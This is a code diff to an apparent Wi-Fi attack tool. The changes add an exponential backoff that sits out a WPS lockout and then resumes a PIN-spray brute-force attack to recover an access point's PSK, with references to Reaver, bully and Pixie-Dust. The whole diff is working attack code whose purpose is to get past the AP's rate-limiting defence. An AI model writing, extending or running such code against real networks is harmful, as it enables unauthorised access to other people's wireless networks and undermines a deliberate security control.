@@ -75,6 +75,62 @@ COMMON_PINS = [
 
 
 ###############################################################################
+# WPS lockout backoff  (pure schedule + interactive sit-out)
+###############################################################################
+
+def lockout_backoff_schedule(
+    max_waits: int = 2,
+    base: int = 60,
+    factor: float = 2.0,
+    cap: int = 300,
+) -> list[int]:
+    """
+    Exponential-backoff wait schedule (seconds) for sitting out a WPS lockout.
+
+    Reaver/bully signal a lock when an AP rate-limits after a handful of PIN
+    attempts. That lock is frequently *transient* (a 60-second cooldown), so a
+    short escalating backoff clears it without abandoning the attack. Returns
+    e.g. ``[60, 120]`` — each entry capped at *cap*.
+    """
+    delays: list[int] = []
+    d = float(base)
+    for _ in range(max(0, max_waits)):
+        delays.append(int(min(d, cap)))
+        d *= factor
+    return delays
+
+
+def _countdown(seconds: int, label: str = "lockout clearing") -> None:
+    """Live countdown; raises KeyboardInterrupt if the user hits Ctrl+C to skip."""
+    for remaining in range(seconds, 0, -1):
+        print(f"\r  {C.DIM}⏳ {label}… {remaining:>3}s (Ctrl+C to skip){C.RESET}",
+              end="", flush=True)
+        time.sleep(1)
+    print("\r" + " " * 60 + "\r", end="", flush=True)
+
+
+def _wait_out_lockout(interface: str, bssid: str, channel: int) -> bool:
+    """
+    Back off through :func:`lockout_backoff_schedule`, re-probing WPS lock state
+    between waits. Returns True if the AP became unlocked (resume the attack),
+    False if it stayed locked or the probe couldn't confirm a clear.
+    """
+    warn("AP signalled a WPS lock — backing off to let a transient rate-limit clear.")
+    for idx, wait_s in enumerate(lockout_backoff_schedule(), 1):
+        info(f"Backoff {idx}: waiting {wait_s}s before re-checking lock state...")
+        try:
+            _countdown(wait_s)
+        except KeyboardInterrupt:
+            warn("Backoff skipped.")
+            return False
+        probe = detect_wps_capability(interface, bssid, channel, timeout=6)
+        if probe.get("enabled") and not probe.get("locked"):
+            success("WPS lock cleared — resuming.")
+            return True
+    return False
+
+
+###############################################################################
 # WPS capability detection  (passive, read-only)
 ###############################################################################
 
@@ -335,7 +391,19 @@ def _pin_spray_attack(
             return
         if result.get("locked"):
             print()
-            warn(f"AP WPS locked after PIN {pin}. Wait for lockout to expire (5–60 min).")
+            # Modern APs rate-limit after a few tries; that lock is often
+            # transient. Sit it out with a bounded backoff and resume rather
+            # than throwing away the rest of the queue.
+            if _wait_out_lockout(interface, bssid, channel):
+                result = _run_wps(cmd, bssid, ssid, timeout=40, single_pin=True)
+                if result.get("psk"):
+                    print()
+                    _handle_result(result, bssid, ssid, f"PIN Spray (pin={pin})")
+                    return
+                if not result.get("locked"):
+                    continue  # unlocked and this PIN failed — move on
+            warn(f"AP WPS still locked after PIN {pin}. Try Pixie-Dust (mode 1) "
+                 f"or wait for the lockout to expire (5–60 min).")
             return
 
     print()
